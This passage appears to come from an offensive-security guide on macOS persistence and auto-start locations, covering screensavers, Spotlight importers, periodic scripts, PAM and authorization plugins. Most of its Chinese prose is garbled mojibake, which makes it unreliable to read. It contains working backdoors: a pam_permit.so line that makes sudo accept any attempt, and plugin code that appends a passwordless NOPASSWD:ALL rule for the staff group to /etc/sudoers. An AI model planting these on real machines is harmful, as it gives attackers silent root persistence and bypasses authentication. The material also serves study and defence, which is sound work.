[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
</code></pre>
<p>{% endcode %}</p>
<h3 id="finder-sync-æ’ä»¶"><a class="header" href="#finder-sync-æ’ä»¶">Finder Sync æ’ä»¶</a></h3>
<p><strong>å†™ä½œ</strong>: <a href="https://theevilbit.github.io/beyond/beyond_0026/">https://theevilbit.github.io/beyond/beyond_0026/</a><br />
<strong>å†™ä½œ</strong>: <a href="https://objective-see.org/blog/blog_0x11.html">https://objective-see.org/blog/blog_0x11.html</a></p>
<ul>
<li>ç»•è¿‡æ²™ç›’çš„æœ‰ç”¨æ€§: <strong>ä¸ï¼Œå› ä¸ºä½ éœ€è¦æ‰§è¡Œè‡ªå·±çš„åº”ç”¨ç¨‹åº</strong></li>
<li>TCC ç»•è¿‡: ???</li>
</ul>
<h4 id="ä½ç½®-17"><a class="header" href="#ä½ç½®-17">ä½ç½®</a></h4>
<ul>
<li>ä¸€ä¸ªç‰¹å®šçš„åº”ç”¨ç¨‹åº</li>
</ul>
<h4 id="æè¿°ä¸åˆ©ç”¨-10"><a class="header" href="#æè¿°ä¸åˆ©ç”¨-10">æè¿°ä¸åˆ©ç”¨</a></h4>
<p>ä¸€ä¸ªå¸¦æœ‰ Finder Sync æ‰©å±•çš„åº”ç”¨ç¨‹åºç¤ºä¾‹ <a href="https://github.com/D00MFist/InSync"><strong>å¯ä»¥åœ¨è¿™é‡Œæ‰¾åˆ°</strong></a>ã€‚</p>
<p>åº”ç”¨ç¨‹åºå¯ä»¥æ‹¥æœ‰ <code>Finder Sync Extensions</code>ã€‚è¿™ä¸ªæ‰©å±•å°†åµŒå…¥åˆ°å°†è¦æ‰§è¡Œçš„åº”ç”¨ç¨‹åºä¸­ã€‚æ­¤å¤–ï¼Œä¸ºäº†ä½¿æ‰©å±•èƒ½å¤Ÿæ‰§è¡Œå…¶ä»£ç ï¼Œå®ƒ <strong>å¿…é¡»è¢«ç­¾å</strong>ï¼Œå¹¶ä¸”å¿…é¡»æœ‰æœ‰æ•ˆçš„ Apple å¼€å‘è€…è¯ä¹¦ï¼Œå®ƒå¿…é¡»æ˜¯ <strong>æ²™ç›’åŒ–çš„</strong>ï¼ˆå°½ç®¡å¯ä»¥æ·»åŠ æ”¾å®½çš„ä¾‹å¤–ï¼‰ï¼Œå¹¶ä¸”å¿…é¡»æ³¨å†Œä¸ºç±»ä¼¼äºï¼š</p>
<pre><code class="language-bash">pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
</code></pre>
<h3 id="å±å¹•ä¿æŠ¤ç¨‹åº"><a class="header" href="#å±å¹•ä¿æŠ¤ç¨‹åº">å±å¹•ä¿æŠ¤ç¨‹åº</a></h3>
<p>Writeup: <a href="https://theevilbit.github.io/beyond/beyond_0016/">https://theevilbit.github.io/beyond/beyond_0016/</a><br />
Writeup: <a href="https://posts.specterops.io/saving-your-access-d562bf5bf90b">https://posts.specterops.io/saving-your-access-d562bf5bf90b</a></p>
<ul>
<li>æœ‰åŠ©äºç»•è¿‡æ²™ç®±: <a href="https://emojipedia.org/large-orange-circle">ğŸŸ </a></li>
<li>ä½†ä½ å°†è¿›å…¥ä¸€ä¸ªå¸¸è§çš„åº”ç”¨ç¨‹åºæ²™ç®±</li>
<li>TCC ç»•è¿‡: <a href="https://emojipedia.org/large-red-circle">ğŸ”´</a></li>
</ul>
<h4 id="ä½ç½®-18"><a class="header" href="#ä½ç½®-18">ä½ç½®</a></h4>
<ul>
<li><code>/System/Library/Screen Savers</code></li>
<li>éœ€è¦ root æƒé™</li>
<li><strong>è§¦å‘</strong>: é€‰æ‹©å±å¹•ä¿æŠ¤ç¨‹åº</li>
<li><code>/Library/Screen Savers</code></li>
<li>éœ€è¦ root æƒé™</li>
<li><strong>è§¦å‘</strong>: é€‰æ‹©å±å¹•ä¿æŠ¤ç¨‹åº</li>
<li><code>~/Library/Screen Savers</code></li>
<li><strong>è§¦å‘</strong>: é€‰æ‹©å±å¹•ä¿æŠ¤ç¨‹åº</li>
</ul>
<figure><img src="../.gitbook/assets/image (38).png" alt="" width="375"><figcaption></figcaption></figure>
<h4 id="æè¿°ä¸åˆ©ç”¨-11"><a class="header" href="#æè¿°ä¸åˆ©ç”¨-11">æè¿°ä¸åˆ©ç”¨</a></h4>
<p>åœ¨ Xcode ä¸­åˆ›å»ºä¸€ä¸ªæ–°é¡¹ç›®ï¼Œå¹¶é€‰æ‹©æ¨¡æ¿ä»¥ç”Ÿæˆæ–°çš„ <strong>å±å¹•ä¿æŠ¤ç¨‹åº</strong>ã€‚ç„¶åï¼Œå°†ä½ çš„ä»£ç æ·»åŠ åˆ°å…¶ä¸­ï¼Œä¾‹å¦‚ä»¥ä¸‹ä»£ç ä»¥ç”Ÿæˆæ—¥å¿—ã€‚</p>
<p><strong>æ„å»º</strong>å®ƒï¼Œå¹¶å°† <code>.saver</code> åŒ…å¤åˆ¶åˆ° <strong><code>~/Library/Screen Savers</code></strong>ã€‚ç„¶åï¼Œæ‰“å¼€å±å¹•ä¿æŠ¤ç¨‹åº GUIï¼Œç‚¹å‡»å®ƒï¼Œåº”è¯¥ä¼šç”Ÿæˆå¤§é‡æ—¥å¿—ï¼š</p>
<p>{% code overflow="wrap" %}</p>
<pre><code class="language-bash">sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
</code></pre>
<p>{% endcode %}</p>
<p>{% hint style="danger" %}
è¯·æ³¨æ„ï¼Œå› ä¸ºåœ¨åŠ è½½æ­¤ä»£ç çš„äºŒè¿›åˆ¶æ–‡ä»¶çš„æƒé™ä¸­ï¼ˆ<code>/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver</code>ï¼‰å¯ä»¥æ‰¾åˆ° <strong><code>com.apple.security.app-sandbox</code></strong>ï¼Œæ‰€ä»¥æ‚¨å°†å¤„äº <strong>å¸¸è§åº”ç”¨ç¨‹åºæ²™ç®±</strong> å†…ã€‚
{% endhint %}</p>
<p>Saver code:</p>
<pre><code class="language-objectivec">//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
self = [super initWithFrame:frame isPreview:isPreview];
if (self) {
[self setAnimationTimeInterval:1/30.0];
}
return self;
}

- (void)startAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super startAnimation];
}

- (void)stopAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super drawRect:rect];
}

- (void)animateOneFrame
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return;
}

- (BOOL)hasConfigureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return NO;
}

- (NSWindow*)configureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
</code></pre>
<h3 id="spotlight-æ’ä»¶"><a class="header" href="#spotlight-æ’ä»¶">Spotlight æ’ä»¶</a></h3>
<p>writeup: <a href="https://theevilbit.github.io/beyond/beyond_0011/">https://theevilbit.github.io/beyond/beyond_0011/</a></p>
<ul>
<li>æœ‰åŠ©äºç»•è¿‡æ²™ç›’: <a href="https://emojipedia.org/large-orange-circle">ğŸŸ </a></li>
<li>ä½†ä½ å°†è¿›å…¥ä¸€ä¸ªåº”ç”¨ç¨‹åºæ²™ç›’</li>
<li>TCC ç»•è¿‡: <a href="https://emojipedia.org/large-red-circle">ğŸ”´</a></li>
<li>æ²™ç›’çœ‹èµ·æ¥éå¸¸æœ‰é™</li>
</ul>
<h4 id="ä½ç½®-19"><a class="header" href="#ä½ç½®-19">ä½ç½®</a></h4>
<ul>
<li><code>~/Library/Spotlight/</code></li>
<li><strong>è§¦å‘</strong>: åˆ›å»ºä¸€ä¸ªç”± Spotlight æ’ä»¶ç®¡ç†çš„æ‰©å±•çš„æ–°æ–‡ä»¶ã€‚</li>
<li><code>/Library/Spotlight/</code></li>
<li><strong>è§¦å‘</strong>: åˆ›å»ºä¸€ä¸ªç”± Spotlight æ’ä»¶ç®¡ç†çš„æ‰©å±•çš„æ–°æ–‡ä»¶ã€‚</li>
<li>éœ€è¦ root æƒé™</li>
<li><code>/System/Library/Spotlight/</code></li>
<li><strong>è§¦å‘</strong>: åˆ›å»ºä¸€ä¸ªç”± Spotlight æ’ä»¶ç®¡ç†çš„æ‰©å±•çš„æ–°æ–‡ä»¶ã€‚</li>
<li>éœ€è¦ root æƒé™</li>
<li><code>Some.app/Contents/Library/Spotlight/</code></li>
<li><strong>è§¦å‘</strong>: åˆ›å»ºä¸€ä¸ªç”± Spotlight æ’ä»¶ç®¡ç†çš„æ‰©å±•çš„æ–°æ–‡ä»¶ã€‚</li>
<li>éœ€è¦æ–°åº”ç”¨</li>
</ul>
<h4 id="æè¿°ä¸åˆ©ç”¨-12"><a class="header" href="#æè¿°ä¸åˆ©ç”¨-12">æè¿°ä¸åˆ©ç”¨</a></h4>
<p>Spotlight æ˜¯ macOS å†…ç½®çš„æœç´¢åŠŸèƒ½ï¼Œæ—¨åœ¨ä¸ºç”¨æˆ·æä¾› <strong>å¿«é€Ÿè€Œå…¨é¢çš„è®¡ç®—æœºæ•°æ®è®¿é—®</strong>ã€‚<br />
ä¸ºäº†ä¿ƒè¿›è¿™ç§å¿«é€Ÿæœç´¢èƒ½åŠ›ï¼ŒSpotlight ç»´æŠ¤ä¸€ä¸ª <strong>ä¸“æœ‰æ•°æ®åº“</strong>ï¼Œå¹¶é€šè¿‡ <strong>è§£æå¤§å¤šæ•°æ–‡ä»¶</strong> åˆ›å»ºç´¢å¼•ï¼Œä»è€Œèƒ½å¤Ÿå¿«é€Ÿæœç´¢æ–‡ä»¶ååŠå…¶å†…å®¹ã€‚</p>
<p>Spotlight çš„åŸºæœ¬æœºåˆ¶æ¶‰åŠä¸€ä¸ªåä¸º 'mds' çš„ä¸­å¤®è¿›ç¨‹ï¼Œä»£è¡¨ <strong>'å…ƒæ•°æ®æœåŠ¡å™¨'</strong>ã€‚è¯¥è¿›ç¨‹åè°ƒæ•´ä¸ª Spotlight æœåŠ¡ã€‚ä¸æ­¤ç›¸è¾…ç›¸æˆçš„æ˜¯å¤šä¸ª 'mdworker' å®ˆæŠ¤è¿›ç¨‹ï¼Œå®ƒä»¬æ‰§è¡Œå„ç§ç»´æŠ¤ä»»åŠ¡ï¼Œä¾‹å¦‚ç´¢å¼•ä¸åŒç±»å‹çš„æ–‡ä»¶ (<code>ps -ef | grep mdworker</code>)ã€‚è¿™äº›ä»»åŠ¡é€šè¿‡ Spotlight å¯¼å…¥æ’ä»¶æˆ– <strong>".mdimporter bundles"</strong> å®ç°ï¼Œä½¿ Spotlight èƒ½å¤Ÿç†è§£å’Œç´¢å¼•å„ç§æ–‡ä»¶æ ¼å¼çš„å†…å®¹ã€‚</p>
<p>æ’ä»¶æˆ– <strong><code>.mdimporter</code></strong> åŒ…ä½äºå‰é¢æåˆ°çš„ä½ç½®ï¼Œå¦‚æœå‡ºç°æ–°çš„åŒ…ï¼Œå®ƒä¼šåœ¨ä¸€åˆ†é’Ÿå†…åŠ è½½ï¼ˆæ— éœ€é‡å¯ä»»ä½•æœåŠ¡ï¼‰ã€‚è¿™äº›åŒ…éœ€è¦æŒ‡æ˜å®ƒä»¬å¯ä»¥ç®¡ç†çš„ <strong>æ–‡ä»¶ç±»å‹å’Œæ‰©å±•å</strong>ï¼Œè¿™æ ·ï¼Œå½“åˆ›å»ºä¸€ä¸ªå…·æœ‰æŒ‡å®šæ‰©å±•åçš„æ–°æ–‡ä»¶æ—¶ï¼ŒSpotlight å°†ä½¿ç”¨å®ƒä»¬ã€‚</p>
<p>å¯ä»¥é€šè¿‡è¿è¡Œ <strong>æ‰¾åˆ°æ‰€æœ‰åŠ è½½çš„ <code>mdimporters</code></strong>:</p>
<pre><code class="language-bash">mdimport -L
Paths: id(501) (
"/System/Library/Spotlight/iWork.mdimporter",
"/System/Library/Spotlight/iPhoto.mdimporter",
"/System/Library/Spotlight/PDF.mdimporter",
[...]
</code></pre>
<p>ä¾‹å¦‚ <strong>/Library/Spotlight/iBooksAuthor.mdimporter</strong> ç”¨äºè§£æè¿™äº›ç±»å‹çš„æ–‡ä»¶ï¼ˆæ‰©å±•å <code>.iba</code> å’Œ <code>.book</code> ç­‰ï¼‰ï¼š</p>
<pre><code class="language-json">plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" =&gt; [
0 =&gt; {
"CFBundleTypeName" =&gt; "iBooks Author Book"
"CFBundleTypeRole" =&gt; "MDImporter"
"LSItemContentTypes" =&gt; [
0 =&gt; "com.apple.ibooksauthor.book"
1 =&gt; "com.apple.ibooksauthor.pkgbook"
2 =&gt; "com.apple.ibooksauthor.template"
3 =&gt; "com.apple.ibooksauthor.pkgtemplate"
]
"LSTypeIsPackage" =&gt; 0
}
]
[...]
=&gt; {
"UTTypeConformsTo" =&gt; [
0 =&gt; "public.data"
1 =&gt; "public.composite-content"
]
"UTTypeDescription" =&gt; "iBooks Author Book"
"UTTypeIdentifier" =&gt; "com.apple.ibooksauthor.book"
"UTTypeReferenceURL" =&gt; "http://www.apple.com/ibooksauthor"
"UTTypeTagSpecification" =&gt; {
"public.filename-extension" =&gt; [
0 =&gt; "iba"
1 =&gt; "book"
]
}
}
[...]
</code></pre>
<p>{% hint style="danger" %}
å¦‚æœä½ æ£€æŸ¥å…¶ä»– <code>mdimporter</code> çš„ Plistï¼Œä½ å¯èƒ½æ‰¾ä¸åˆ°æ¡ç›® <strong><code>UTTypeConformsTo</code></strong>ã€‚è¿™æ˜¯å› ä¸ºå®ƒæ˜¯ä¸€ä¸ªå†…ç½®çš„ <em>ç»Ÿä¸€ç±»å‹æ ‡è¯†ç¬¦</em> (<a href="https://en.wikipedia.org/wiki/Uniform_Type_Identifier">UTI</a>)ï¼Œä¸éœ€è¦æŒ‡å®šæ‰©å±•åã€‚</p>
<p>æ­¤å¤–ï¼Œç³»ç»Ÿé»˜è®¤æ’ä»¶æ€»æ˜¯ä¼˜å…ˆï¼Œå› æ­¤æ”»å‡»è€…åªèƒ½è®¿é—®æœªè¢«è‹¹æœè‡ªå·±çš„ <code>mdimporters</code> ç´¢å¼•çš„æ–‡ä»¶ã€‚
{% endhint %}</p>
<p>è¦åˆ›å»ºä½ è‡ªå·±çš„å¯¼å…¥å™¨ï¼Œä½ å¯ä»¥ä»è¿™ä¸ªé¡¹ç›®å¼€å§‹ï¼š<a href="https://github.com/megrimm/pd-spotlight-importer">https://github.com/megrimm/pd-spotlight-importer</a>ï¼Œç„¶åæ›´æ”¹åç§°ã€<strong><code>CFBundleDocumentTypes</code></strong> å¹¶æ·»åŠ  <strong><code>UTImportedTypeDeclarations</code></strong>ï¼Œä»¥ä¾¿æ”¯æŒä½ æƒ³è¦æ”¯æŒçš„æ‰©å±•ï¼Œå¹¶åœ¨ <strong><code>schema.xml</code></strong> ä¸­åæ˜ å®ƒä»¬ã€‚<br />
ç„¶å <strong>æ›´æ”¹</strong> å‡½æ•° <strong><code>GetMetadataForFile</code></strong> çš„ä»£ç ï¼Œä»¥ä¾¿åœ¨åˆ›å»ºå…·æœ‰å¤„ç†æ‰©å±•åçš„æ–‡ä»¶æ—¶æ‰§è¡Œä½ çš„æœ‰æ•ˆè½½è·ã€‚</p>
<p>æœ€å <strong>æ„å»ºå¹¶å¤åˆ¶ä½ çš„æ–° <code>.mdimporter</code></strong> åˆ°ä¹‹å‰çš„ä¸€ä¸ªä½ç½®ï¼Œä½ å¯ä»¥é€šè¿‡ <strong>ç›‘æ§æ—¥å¿—</strong> æˆ–æ£€æŸ¥ <strong><code>mdimport -L.</code></strong> æ¥æŸ¥çœ‹å®ƒæ˜¯å¦è¢«åŠ è½½ã€‚</p>
<h3 id="åå¥½é¢æ¿"><a class="header" href="#åå¥½é¢æ¿"><del>åå¥½é¢æ¿</del></a></h3>
<p>{% hint style="danger" %}
çœ‹èµ·æ¥è¿™ä¸ªä¸å†æœ‰æ•ˆäº†ã€‚
{% endhint %}</p>
<p>å†™ä½œï¼š <a href="https://theevilbit.github.io/beyond/beyond_0009/">https://theevilbit.github.io/beyond/beyond_0009/</a></p>
<ul>
<li>æœ‰åŠ©äºç»•è¿‡æ²™ç›’ï¼š <a href="https://emojipedia.org/large-orange-circle">ğŸŸ </a></li>
<li>éœ€è¦ç‰¹å®šç”¨æˆ·æ“ä½œ</li>
<li>TCC ç»•è¿‡ï¼š <a href="https://emojipedia.org/large-red-circle">ğŸ”´</a></li>
</ul>
<h4 id="ä½ç½®-20"><a class="header" href="#ä½ç½®-20">ä½ç½®</a></h4>
<ul>
<li><strong><code>/System/Library/PreferencePanes</code></strong></li>
<li><strong><code>/Library/PreferencePanes</code></strong></li>
<li><strong><code>~/Library/PreferencePanes</code></strong></li>
</ul>
<h4 id="æè¿°-4"><a class="header" href="#æè¿°-4">æè¿°</a></h4>
<p>çœ‹èµ·æ¥è¿™ä¸ªä¸å†æœ‰æ•ˆäº†ã€‚</p>
<h2 id="root-æ²™ç›’ç»•è¿‡"><a class="header" href="#root-æ²™ç›’ç»•è¿‡">Root æ²™ç›’ç»•è¿‡</a></h2>
<p>{% hint style="success" %}
åœ¨è¿™é‡Œä½ å¯ä»¥æ‰¾åˆ°æœ‰ç”¨çš„ <strong>æ²™ç›’ç»•è¿‡</strong> å¯åŠ¨ä½ç½®ï¼Œå…è®¸ä½ é€šè¿‡ <strong>å†™å…¥æ–‡ä»¶</strong> ä»¥ <strong>root</strong> èº«ä»½ç®€å•æ‰§è¡ŒæŸäº›æ“ä½œå’Œ/æˆ–éœ€è¦å…¶ä»– <strong>å¥‡æ€ªæ¡ä»¶</strong>ã€‚
{% endhint %}</p>
<h3 id="å®šæœŸ"><a class="header" href="#å®šæœŸ">å®šæœŸ</a></h3>
<p>å†™ä½œï¼š <a href="https://theevilbit.github.io/beyond/beyond_0019/">https://theevilbit.github.io/beyond/beyond_0019/</a></p>
<ul>
<li>æœ‰åŠ©äºç»•è¿‡æ²™ç›’ï¼š <a href="https://emojipedia.org/large-orange-circle">ğŸŸ </a></li>
<li>ä½†ä½ éœ€è¦æ˜¯ root</li>
<li>TCC ç»•è¿‡ï¼š <a href="https://emojipedia.org/large-red-circle">ğŸ”´</a></li>
</ul>
<h4 id="ä½ç½®-21"><a class="header" href="#ä½ç½®-21">ä½ç½®</a></h4>
<ul>
<li><code>/etc/periodic/daily</code>, <code>/etc/periodic/weekly</code>, <code>/etc/periodic/monthly</code>, <code>/usr/local/etc/periodic</code></li>
<li>éœ€è¦ root</li>
<li><strong>è§¦å‘</strong>ï¼š å½“æ—¶é—´åˆ°æ¥æ—¶</li>
<li><code>/etc/daily.local</code>, <code>/etc/weekly.local</code> æˆ– <code>/etc/monthly.local</code></li>
<li>éœ€è¦ root</li>
<li><strong>è§¦å‘</strong>ï¼š å½“æ—¶é—´åˆ°æ¥æ—¶</li>
</ul>
<h4 id="æè¿°ä¸åˆ©ç”¨-13"><a class="header" href="#æè¿°ä¸åˆ©ç”¨-13">æè¿°ä¸åˆ©ç”¨</a></h4>
<p>å®šæœŸè„šæœ¬ (<strong><code>/etc/periodic</code></strong>) æ˜¯ç”±äºåœ¨ <code>/System/Library/LaunchDaemons/com.apple.periodic*</code> ä¸­é…ç½®çš„ <strong>å¯åŠ¨å®ˆæŠ¤è¿›ç¨‹</strong> è€Œæ‰§è¡Œçš„ã€‚è¯·æ³¨æ„ï¼Œå­˜å‚¨åœ¨ <code>/etc/periodic/</code> ä¸­çš„è„šæœ¬æ˜¯ä»¥ <strong>æ–‡ä»¶æ‰€æœ‰è€…</strong> çš„èº«ä»½ <strong>æ‰§è¡Œ</strong> çš„ï¼Œå› æ­¤è¿™å¯¹äºæ½œåœ¨çš„ç‰¹æƒå‡çº§æ— æ•ˆã€‚</p>
<pre><code class="language-bash"># Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
</code></pre>
<p>{% endcode %}</p>
<p>è¿˜æœ‰å…¶ä»–å®šæœŸè„šæœ¬å°†åœ¨ <strong><code>/etc/defaults/periodic.conf</code></strong> ä¸­æŒ‡ç¤ºæ‰§è¡Œï¼š</p>
<pre><code class="language-bash">grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
</code></pre>
<p>å¦‚æœæ‚¨æˆåŠŸå†™å…¥ä»»ä½•æ–‡ä»¶ <code>/etc/daily.local</code>ã€<code>/etc/weekly.local</code> æˆ– <code>/etc/monthly.local</code>ï¼Œå®ƒå°†ä¼š <strong>è¿Ÿæ—©è¢«æ‰§è¡Œ</strong>ã€‚</p>
<p>{% hint style="warning" %}
è¯·æ³¨æ„ï¼Œå‘¨æœŸæ€§è„šæœ¬å°†ä»¥ <strong>è„šæœ¬æ‰€æœ‰è€…çš„èº«ä»½æ‰§è¡Œ</strong>ã€‚å› æ­¤ï¼Œå¦‚æœå¸¸è§„ç”¨æˆ·æ‹¥æœ‰è¯¥è„šæœ¬ï¼Œå®ƒå°†ä»¥è¯¥ç”¨æˆ·çš„èº«ä»½æ‰§è¡Œï¼ˆè¿™å¯èƒ½ä¼šé˜²æ­¢ç‰¹æƒå‡çº§æ”»å‡»ï¼‰ã€‚
{% endhint %}</p>
<h3 id="pam"><a class="header" href="#pam">PAM</a></h3>
<p>å†™ä½œï¼š <a href="../linux-hardening/linux-post-exploitation/pam-pluggable-authentication-modules.html">Linux Hacktricks PAM</a><br />
å†™ä½œï¼š <a href="https://theevilbit.github.io/beyond/beyond_0005/">https://theevilbit.github.io/beyond/beyond_0005/</a></p>
<ul>
<li>æœ‰åŠ©äºç»•è¿‡æ²™ç®±ï¼š <a href="https://emojipedia.org/large-orange-circle">ğŸŸ </a></li>
<li>ä½†æ‚¨éœ€è¦æ˜¯ root</li>
<li>TCC ç»•è¿‡ï¼š <a href="https://emojipedia.org/large-red-circle">ğŸ”´</a></li>
</ul>
<h4 id="ä½ç½®-22"><a class="header" href="#ä½ç½®-22">ä½ç½®</a></h4>
<ul>
<li>å§‹ç»ˆéœ€è¦ root</li>
</ul>
<h4 id="æè¿°ä¸åˆ©ç”¨-14"><a class="header" href="#æè¿°ä¸åˆ©ç”¨-14">æè¿°ä¸åˆ©ç”¨</a></h4>
<p>ç”±äº PAM æ›´ä¸“æ³¨äº <strong>æŒä¹…æ€§</strong> å’Œæ¶æ„è½¯ä»¶ï¼Œè€Œä¸æ˜¯åœ¨ macOS ä¸­çš„ç®€å•æ‰§è¡Œï¼Œå› æ­¤æœ¬åšå®¢ä¸ä¼šç»™å‡ºè¯¦ç»†çš„è§£é‡Šï¼Œ<strong>è¯·é˜…è¯»å†™ä½œä»¥æ›´å¥½åœ°ç†è§£æ­¤æŠ€æœ¯</strong>ã€‚</p>
<p>ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ£€æŸ¥ PAM æ¨¡å—ï¼š</p>
<pre><code class="language-bash">ls -l /etc/pam.d
</code></pre>
<p>ä¸€ç§åˆ©ç”¨PAMçš„æŒä¹…æ€§/ç‰¹æƒæå‡æŠ€æœ¯ï¼Œä¿®æ”¹æ¨¡å— /etc/pam.d/sudo åœ¨å¼€å¤´æ·»åŠ ä»¥ä¸‹è¡Œæ˜¯éå¸¸ç®€å•çš„ï¼š</p>
<pre><code class="language-bash">auth       sufficient     pam_permit.so
</code></pre>
<p>æ‰€ä»¥å®ƒçœ‹èµ·æ¥åƒè¿™æ ·ï¼š</p>
<pre><code class="language-bash"># sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
</code></pre>
<p>å› æ­¤ï¼Œä»»ä½•å°è¯•ä½¿ç”¨ <strong><code>sudo</code> éƒ½ä¼šæœ‰æ•ˆ</strong>ã€‚</p>
<p>{% hint style="danger" %}
è¯·æ³¨æ„ï¼Œæ­¤ç›®å½•å—åˆ° TCC ä¿æŠ¤ï¼Œå› æ­¤ç”¨æˆ·å¾ˆå¯èƒ½ä¼šæ”¶åˆ°è¯·æ±‚è®¿é—®çš„æç¤ºã€‚
{% endhint %}</p>
<p>å¦ä¸€ä¸ªä¸é”™çš„ä¾‹å­æ˜¯ suï¼Œæ‚¨å¯ä»¥çœ‹åˆ°ä¹Ÿå¯ä»¥å‘ PAM æ¨¡å—æä¾›å‚æ•°ï¼ˆæ‚¨ä¹Ÿå¯ä»¥åœ¨æ­¤æ–‡ä»¶ä¸­æ¤å…¥åé—¨ï¼‰ï¼š</p>
<pre><code class="language-bash">cat /etc/pam.d/su
# su: auth account session
auth       sufficient     pam_rootok.so
auth       required       pam_opendirectory.so
account    required       pam_group.so no_warn group=admin,wheel ruser root_only fail_safe
account    required       pam_opendirectory.so no_check_shell
password   required       pam_opendirectory.so
session    required       pam_launchd.so
</code></pre>
<h3 id="æˆæƒæ’ä»¶"><a class="header" href="#æˆæƒæ’ä»¶">æˆæƒæ’ä»¶</a></h3>
<p>Writeup: <a href="https://theevilbit.github.io/beyond/beyond_0028/">https://theevilbit.github.io/beyond/beyond_0028/</a><br />
Writeup: <a href="https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65">https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65</a></p>
<ul>
<li>æœ‰åŠ©äºç»•è¿‡æ²™ç›’: <a href="https://emojipedia.org/large-orange-circle">ğŸŸ </a></li>
<li>ä½†ä½ éœ€è¦æ˜¯rootå¹¶è¿›è¡Œé¢å¤–é…ç½®</li>
<li>TCC ç»•è¿‡: ???</li>
</ul>
<h4 id="ä½ç½®-23"><a class="header" href="#ä½ç½®-23">ä½ç½®</a></h4>
<ul>
<li><code>/Library/Security/SecurityAgentPlugins/</code></li>
<li>éœ€è¦rootæƒé™</li>
<li>è¿˜éœ€è¦é…ç½®æˆæƒæ•°æ®åº“ä»¥ä½¿ç”¨è¯¥æ’ä»¶</li>
</ul>
<h4 id="æè¿°ä¸åˆ©ç”¨-15"><a class="header" href="#æè¿°ä¸åˆ©ç”¨-15">æè¿°ä¸åˆ©ç”¨</a></h4>
<p>ä½ å¯ä»¥åˆ›å»ºä¸€ä¸ªæˆæƒæ’ä»¶ï¼Œå½“ç”¨æˆ·ç™»å½•æ—¶æ‰§è¡Œä»¥ä¿æŒæŒä¹…æ€§ã€‚æœ‰å…³å¦‚ä½•åˆ›å»ºè¿™äº›æ’ä»¶çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹ä¹‹å‰çš„å†™ä½œï¼ˆå¹¶å°å¿ƒï¼Œç¼–å†™ä¸å½“å¯èƒ½ä¼šé”å®šä½ ï¼Œä½ éœ€è¦ä»æ¢å¤æ¨¡å¼æ¸…ç†ä½ çš„macï¼‰ã€‚</p>
<pre><code class="language-objectivec">// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import &lt;Foundation/Foundation.h&gt;

__attribute__((constructor)) static void run()
{
NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" &gt;&gt; /etc/sudoers");
}
</code></pre>
